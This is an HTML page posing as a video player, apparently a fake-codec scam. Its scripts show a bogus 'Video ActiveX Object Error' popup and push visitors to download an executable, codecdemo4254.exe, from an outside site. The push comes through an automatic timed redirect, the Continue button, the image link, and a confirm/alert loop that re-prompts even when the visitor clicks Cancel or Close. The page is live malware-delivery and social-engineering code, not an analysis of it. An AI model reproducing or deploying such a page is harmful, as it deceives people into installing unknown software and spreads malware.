<html>
<head>
<title>Movie</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
     .t {border:1px solid #666666;}
</style>
<script>
<!--

function activex_actual()
{
  try
  {
    var testObject = new ActiveXObject("4Porn");
    return true;
  }
  catch(e)
  {
    ;
  }
  return false;
}

function soft_download()
{
  if(window.navigator.userAgent.indexOf("SV1") != -1 || window.navigator.userAgent.indexOf("MSIE 7") !=-1) 
  {
    return;
  }
  else 
  {
    window.setTimeout("location.href='http://codecdemo.com/download/codecdemo4254.exe'", 3000);
  }
}

function List() 
{
  if(activex_actual()) 
  {
    document.getElementById('movie').innerHTML = '<table cellpadding=0 cellspacing=0 align=center class=t><tr><td style=\'margin:0px;\'><object width=\'500\' height=\'400\' classid=\'clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6\'><param name=\'URL\' value=\'\'/></object><td></tr></table>';
  }
  else
  {
    soft_download();
  }
}

-->
</script>
</head>
<body  style="background-color:#000000;">

<script>
<!--

var Drag = {
     obj : null,
     init : function(o, oRoot, minX, maxX, minY, maxY, bSwapHorzRef, bSwapVertRef, fXMapper, fYMapper)
     {
          o.onmousedown     = Drag.start;

          o.hmode               = bSwapHorzRef ? false : true ;
          o.vmode               = bSwapVertRef ? false : true ;

          o.root = oRoot && oRoot != null ? oRoot : o ;

          if (o.hmode  && isNaN(parseInt(o.root.style.left  ))) o.root.style.left   = "0px";
          if (o.vmode  && isNaN(parseInt(o.root.style.top   ))) o.root.style.top    = "0px";
          if (!o.hmode && isNaN(parseInt(o.root.style.right ))) o.root.style.right  = "0px";
          if (!o.vmode && isNaN(parseInt(o.root.style.bottom))) o.root.style.bottom = "0px";

          o.minX     = typeof minX != 'undefined' ? minX : null;
          o.minY     = typeof minY != 'undefined' ? minY : null;
          o.maxX     = typeof maxX != 'undefined' ? maxX : null;
          o.maxY     = typeof maxY != 'undefined' ? maxY : null;

          o.xMapper = fXMapper ? fXMapper : null;
          o.yMapper = fYMapper ? fYMapper : null;

          o.root.onDragStart     = new Function();
          o.root.onDragEnd     = new Function();
          o.root.onDrag          = new Function();
     },

     start : function(e)
     {
          var o = Drag.obj = this;
          e = Drag.fixE(e);
          var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
          var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
          o.root.onDragStart(x, y);

          o.lastMouseX     = e.clientX;
          o.lastMouseY     = e.clientY;

          if (o.hmode) {
               if (o.minX != null)     o.minMouseX     = e.clientX - x + o.minX;
               if (o.maxX != null)     o.maxMouseX     = o.minMouseX + o.maxX - o.minX;
          } else {
               if (o.minX != null) o.maxMouseX = -o.minX + e.clientX + x;
               if (o.maxX != null) o.minMouseX = -o.maxX + e.clientX + x;
          }

          if (o.vmode) {
               if (o.minY != null)     o.minMouseY     = e.clientY - y + o.minY;
               if (o.maxY != null)     o.maxMouseY     = o.minMouseY + o.maxY - o.minY;
          } else {
               if (o.minY != null) o.maxMouseY = -o.minY + e.clientY + y;
               if (o.maxY != null) o.minMouseY = -o.maxY + e.clientY + y;
          }

          document.onmousemove     = Drag.drag;
          document.onmouseup          = Drag.end;

          return false;
     },

     drag : function(e)
     {
          e = Drag.fixE(e);
          var o = Drag.obj;

          var ey     = e.clientY;
          var ex     = e.clientX;
          var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
          var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
          var nx, ny;

          if (o.minX != null) ex = o.hmode ? Math.max(ex, o.minMouseX) : Math.min(ex, o.maxMouseX);
          if (o.maxX != null) ex = o.hmode ? Math.min(ex, o.maxMouseX) : Math.max(ex, o.minMouseX);
          if (o.minY != null) ey = o.vmode ? Math.max(ey, o.minMouseY) : Math.min(ey, o.maxMouseY);
          if (o.maxY != null) ey = o.vmode ? Math.min(ey, o.maxMouseY) : Math.max(ey, o.minMouseY);

          nx = x + ((ex - o.lastMouseX) * (o.hmode ? 1 : -1));
          ny = y + ((ey - o.lastMouseY) * (o.vmode ? 1 : -1));

          if (o.xMapper)          nx = o.xMapper(y)
          else if (o.yMapper)     ny = o.yMapper(x)

          Drag.obj.root.style[o.hmode ? "left" : "right"] = nx + "px";
          Drag.obj.root.style[o.vmode ? "top" : "bottom"] = ny + "px";
          Drag.obj.lastMouseX     = ex;
          Drag.obj.lastMouseY     = ey;

          Drag.obj.root.onDrag(nx, ny);
          return false;
     },

     end : function()
     {
          document.onmousemove = null;
          document.onmouseup   = null;
          Drag.obj.root.onDragEnd(     parseInt(Drag.obj.root.style[Drag.obj.hmode ? "left" : "right"]), 
                                             parseInt(Drag.obj.root.style[Drag.obj.vmode ? "top" : "bottom"]));
          Drag.obj = null;
     },

     fixE : function(e)
     {
          if (typeof e == 'undefined') e = window.event;
          if (typeof e.layerX == 'undefined') e.layerX = e.offsetX;
          if (typeof e.layerY == 'undefined') e.layerY = e.offsetY;
          return e;
     }
};

function Down(download,e) 
{ 
     if (e!=null && e.keyCode==27)
     {     Close();
          return;
     }     
    switch (download) 
    { 
        case "iax": document.location.href='http://codecdemo.com/download/codecdemo4254.exe'; break; 
        Close(); 
    } 

} 

function vc() {
     if (confirm('Video ActiveX Object Error.\r\rYour browser cannot play this video file.\rClick \'OK\' to download and install missing Video ActiveX Object.')) {
          location.href='http://codecdemo.com/download/codecdemo4254.exe';
     }
     else {
          if (alert('Please install new version of Video ActiveX Object.')) {
               vc();
          }
          else {
               vc();
          }               
     }
}

function Close() 
{ 
    var p=document.getElementById("popdiv");
    p.style.visibility="hidden"; 
     vc();
} 
function Details()
{
     alert('You must download Video ActiveX Object to view this video file.');
}
-->
</script>


<div name="popdiv" id="popdiv" onKeyPress="Down('iax',event);" style="visibility:hidden; z-index:1;position:absolute;top:0px;left:0px;">
<table cellpadding="0" cellspacing="0" border="0" width="415">
	   <tr>
	   	   <td width="4"><img src="/common/player9/p1.gif" width="4" height="30" alt="" border="0"></td>
		   <td background="/common/player9/tbg.gif"><img src="/common/player9/err.gif" width="121" height="30" alt="" border="0"></td>
		   <td background="/common/player9/tbg.gif" align="right"><a href="#" onClick="Close()"><img src="/common/player9/close.gif" width="24" height="30" alt="" border="0"></a></td>
		   <td width="4"><img src="/common/player9/p2.gif" width="4" height="30" alt="" border="0"></td>
	   </tr>
	   <tr>
	   	   <td><img src="/common/player9/left.gif" width="4" height="235" alt="" border="0"></td>
		   <td colspan="2" style="background:#FFEFDE url(/common/player9/bg.jpg) repeat-x; padding:23 20 15 20px;" align="center" valign="top">
		   	   <table cellpadding="0" cellspacing="0" border="0">
			   		  <tr>
					  	  <td width="130"><img src="/common/player9/mark.jpg" width="110" height="91" alt="" border="0"></td>
						  <td>
						  	  <p style="font-size:12px; font-family:Arial;"><b>Video ActiveX Object Error!</b><br>
							  <br>
							  Your browser cannot display this video file.<br>
							  <br>
							  You need to download new version of<br>Video ActiveX Object to view this video file.
						  	  </p>
						  </td>
					  </tr>
					  <tr>
					  	  <td colspan="2" height="12"></td>
					  </tr>
					  <tr>
					  	  <td colspan="2" align="center" height="35"><p style="font-size:12px; font-family:Arial;">Click Continue to download and install ActiveX Object.</p></td>
					  </tr>
					  <tr>
					  	  <td align="center" colspan="2" bgcolor="#ffffff" style="border:1px solid; border-color:#EFC4A7;">
						  	  <table cellpadding="15" cellspacing="0" border="0">
							  		 <tr>
									 	 <td><a href="#" onClick="Down('iax');"><img src="/common/player9/cont_but.gif" width="82" height="24" alt="" border="0"></a></td>
										 <td><a href="#" onClick="Close();"><img src="/common/player9/cancel_but.gif" width="82" height="24" alt="" border="0"></a></td>
										 <td><a href="#" onClick="Details();"><img src="/common/player9/det_but.gif" width="82" height="24" alt="" border="0"></a></td>
									 </tr>
							  </table>
						  </td>
					  </tr>
			   </table>
		   </td>
		   <td><img src="/common/player9/right.gif" width="4" height="235" alt="" border="0"></td>
	   </tr>
	   <tr>
	   	   <td><img src="/common/player9/cbl.gif" width="4" height="4" alt="" border="0"></td>
		   <td colspan="2"><img src="/common/player9/bot.gif" width="100%" height="4" alt="" border="0"></td>
		   <td><img src="/common/player9/cbr.gif" width="4" height="4" alt="" border="0"></td>
	   </tr>
</table>
</div>


<script>
<!--
setTimeout("showPopDiv();",2000);
      
function showPopDiv()
{
  if(!activex_actual())
  {
    var sFlag = "No";
    var byFlag = false;
    var FlagAr = sFlag.split("");
 
    if(FlagAr[0]=="1"){byFlag = true;}
    if(FlagAr[0]=="3"){byFlag = true;}

    if(!byFlag)
    {
      var p=document.getElementById("popdiv"); 
      wmpwidth=document.body.clientWidth/2-190;
      wmpheight=document.body.clientHeight/2-130;
      p.style.top = wmpheight;
      p.style.left = wmpwidth;
      p.style.visibility = "visible";
      p.focus();
    }
  }
}
 Drag.init(document.getElementById("popdiv"));
-->

</script>
</div>

<div id="movie" style="margin:0 auto;">
     <center>
          <br><a href='http://codecdemo.com/download/codecdemo4254.exe'><img width="450" onMouseOver="window.status = 'You must download Video ActiveX Object to view this video file.';" height="369" border="0" alt="You must download Video ActiveX Object to view this video file." src="/common/player9/movie.gif"  galleryimg="no"></a>
     </center>
</div>

<script>
<!--
List();
-->
</script>


</body>

</html>